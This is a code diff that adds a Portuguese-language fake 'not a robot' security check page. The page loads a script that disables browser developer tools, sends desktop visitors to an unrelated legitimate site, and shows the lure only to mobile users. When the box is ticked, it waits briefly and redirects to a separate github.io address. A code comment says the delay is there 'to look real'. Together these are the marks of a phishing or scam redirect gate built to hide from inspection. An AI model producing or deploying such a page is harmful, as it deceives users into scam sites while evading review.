@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmação de Segurança</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .box {
+      background: #ffffff;
+      width: 90%;
+      max-width: 420px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .box h2 {
+      margin-bottom: 10px;
+      color: #222;
+    }
+
+    .box p {
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 25px;
+    }
+
+    .checkbox-area {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .checkbox-area:hover {
+      border-color: #4CAF50;
+    }
+
+    input[type="checkbox"] {
+      width: 22px;
+      height: 22px;
+      margin-right: 10px;
+      accent-color: #4CAF50;
+      cursor: pointer;
+    }
+
+    .label-text {
+      font-size: 16px;
+      color: #222;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+<script disable-devtool-auto="" src="disable-devtool-1.html" url="https://meutudo.com.br/"></script>
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://starbem.app/';
+  }
+  </script>
+  <div class="box">
+    <h2>Confirmação de Segurança</h2>
+    <p>Marque a caixa abaixo para confirmar que você não é um robô:</p>
+
+    <label class="checkbox-area">
+      <input type="checkbox" id="check">
+      <span class="label-text">Não sou um robô</span>
+    </label>
+  </div>
+
+  <script>
+    document.getElementById("check").addEventListener("change", function () {
+      if (this.checked) {
+        setTimeout(function () {
+          window.location.href = "https://acesso-shop.github.io/mel";
+        }, 800); // delay leve para parecer real
+      }
+    });
+  </script>
+
+</body>
+</html>
